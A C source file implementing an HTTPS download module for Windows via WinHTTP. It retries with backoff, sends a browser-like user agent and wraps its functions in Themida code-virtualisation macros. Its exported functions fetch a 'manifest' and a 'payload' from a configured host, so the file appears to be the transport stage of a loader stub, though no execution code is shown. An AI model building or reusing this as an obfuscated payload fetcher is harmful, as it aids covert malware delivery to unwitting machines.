/* stub_transport.c — HTTPS download via WinHTTP. */
#include "stub_transport.h"
#include "ThemidaSDK.h"
#include <winhttp.h>
#pragma comment(lib, "winhttp.lib")

extern void WriteLogFile(const char* msg);

/* Single-shot download; caller handles retry. */
static int do_get(const wchar_t* host, const wchar_t* path, int timeoutMs,
                  BYTE** outBuf, SIZE_T* outLen)
{
    VM_START
    int rc = -10;
    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
    BYTE* buf = NULL;
    SIZE_T cap = 0, used = 0;

    WriteLogFile("Transport: WinHttpOpen");
    /* Use DEFAULT_PROXY instead of AUTOMATIC_PROXY.
     * AUTOMATIC_PROXY triggers WPAD DNS lookup which can hang 30+ seconds.
     * DEFAULT_PROXY reads the proxy from IE/WinHTTP settings instantly. */
    hSession = WinHttpOpen(L"Mozilla/5.0",
                           WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                           WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) { WriteLogFile("Transport: WinHttpOpen failed"); rc = -10; goto done; }

    if (timeoutMs <= 0) timeoutMs = 15000;
    WinHttpSetTimeouts(hSession, timeoutMs, timeoutMs, timeoutMs, timeoutMs);

    WriteLogFile("Transport: WinHttpConnect");
    hConnect = WinHttpConnect(hSession, host, INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) { WriteLogFile("Transport: WinHttpConnect failed"); rc = -11; goto done; }

    WriteLogFile("Transport: WinHttpOpenRequest");
    hRequest = WinHttpOpenRequest(hConnect, L"GET", path, NULL,
                                  WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
                                  WINHTTP_FLAG_SECURE);
    if (!hRequest) { WriteLogFile("Transport: WinHttpOpenRequest failed"); rc = -12; goto done; }

    WriteLogFile("Transport: WinHttpSendRequest");
    if (!WinHttpSendRequest(hRequest,
                            WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                            WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
        WriteLogFile("Transport: WinHttpSendRequest failed"); rc = -13; goto done;
    }
    WriteLogFile("Transport: WinHttpReceiveResponse");
    if (!WinHttpReceiveResponse(hRequest, NULL)) {
        WriteLogFile("Transport: WinHttpReceiveResponse failed"); rc = -14; goto done;
    }

    /* Status check */
    DWORD status = 0, szStatus = sizeof(status);
    if (!WinHttpQueryHeaders(hRequest,
                             WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                             NULL, &status, &szStatus, NULL)) { rc = -15; goto done; }
    if (status != 200) {
        char b[64]; wsprintfA(b, "Transport: HTTP %lu", status);
        WriteLogFile(b);
        rc = -16; goto done;
    }
    WriteLogFile("Transport: HTTP 200 OK, reading body");

    /* Stream body into growing heap buffer. */
    cap = 64 * 1024;
    buf = (BYTE*)HeapAlloc(GetProcessHeap(), 0, cap);
    if (!buf) { rc = -17; goto done; }

    for (;;) {
        DWORD avail = 0;
        if (!WinHttpQueryDataAvailable(hRequest, &avail)) { rc = -18; goto done; }
        if (avail == 0) break;
        if (used + avail > cap) {
            SIZE_T newCap = cap;
            while (used + avail > newCap) newCap *= 2;
            BYTE* nb = (BYTE*)HeapReAlloc(GetProcessHeap(), 0, buf, newCap);
            if (!nb) { rc = -19; goto done; }
            buf = nb; cap = newCap;
        }
        DWORD got = 0;
        if (!WinHttpReadData(hRequest, buf + used, avail, &got)) { rc = -20; goto done; }
        if (got == 0) break;
        used += got;
    }

    {
        char b[80]; wsprintfA(b, "Transport: download complete, %lu bytes", (DWORD)used);
        WriteLogFile(b);
    }
    *outBuf = buf;
    *outLen = used;
    buf = NULL; /* transferred ownership */
    rc = 0;

done:
    if (buf) {
        RtlSecureZeroMemory(buf, used);
        HeapFree(GetProcessHeap(), 0, buf);
    }
    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);
    VM_END
    return rc;
}

static int retry_get(const wchar_t* host, const wchar_t* path, int timeoutMs,
                     BYTE** outBuf, SIZE_T* outLen)
{
    MUTATE_START
    /* 3 attempts: 500ms, 1500ms, 3000ms backoff between failures. */
    static const DWORD backoff[] = { 500, 1500, 3000 };
    int rc = -1;
    for (int i = 0; i < 3; i++) {
        rc = do_get(host, path, timeoutMs, outBuf, outLen);
        if (rc == 0) { break; }
        char b[80]; wsprintfA(b, "Transport: GET attempt %d failed rc=%d", i+1, rc);
        WriteLogFile(b);
        if (i < 2) Sleep(backoff[i]);
    }
    MUTATE_END
    return rc;
}

int Stub_DownloadManifest(const StubTransportCfg* cfg, BYTE** outBuf, SIZE_T* outLen) {
    if (!cfg || !cfg->host || !cfg->manifest || !outBuf || !outLen) return -1;
    return retry_get(cfg->host, cfg->manifest, cfg->timeoutMs, outBuf, outLen);
}

int Stub_DownloadPayload(const StubTransportCfg* cfg, BYTE** outBuf, SIZE_T* outLen) {
    if (!cfg || !cfg->host || !cfg->payload || !outBuf || !outLen) return -1;
    return retry_get(cfg->host, cfg->payload, cfg->timeoutMs, outBuf, outLen);
}
